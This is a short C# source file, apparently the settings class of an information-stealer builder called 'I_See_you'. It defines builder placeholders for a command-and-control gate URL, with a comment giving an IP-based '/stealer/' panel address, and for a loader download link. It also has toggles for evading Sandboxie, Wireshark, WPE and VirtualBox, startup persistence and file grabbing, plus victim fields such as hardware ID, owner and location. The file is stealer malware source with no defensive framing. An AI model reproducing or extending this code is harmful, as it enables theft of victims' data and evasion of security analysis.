
using System;
using System.Threading;

namespace I_See_you
{
    class RawSettings
    {
        public static readonly string SiteUrl = "[gate]"; //http://93.170.123.78/stealer/
        public static readonly string Downloadurl = "[dLink]";
        public static readonly bool OnLoader = Convert.ToBoolean("[loader]");
        public static readonly bool AntiSandboxie = Convert.ToBoolean("[AntiSandboxie]");
        public static readonly bool AntiWireshark = Convert.ToBoolean("[AntiWireshark]");
        public static readonly bool AntiWPE = Convert.ToBoolean("[AntiWPE]");
        public static readonly bool AntiVBox = Convert.ToBoolean("[AntiVBox]");
        public static readonly bool StartUpOn = Convert.ToBoolean("[StartUpOn]");
        public static readonly bool FileGrab = Convert.ToBoolean("[FileGrab]");
        public static readonly string DownloadPath = "[downPath]";
        public static readonly string StartUpPath = "[sLocation]";
        public static string HWID { get; internal set; }
        public static string RAM { get; internal set; }
        public static string Owner { get; internal set; }
        public static string Version { get; internal set; }
        public static string Location { get; internal set; }
    }
}
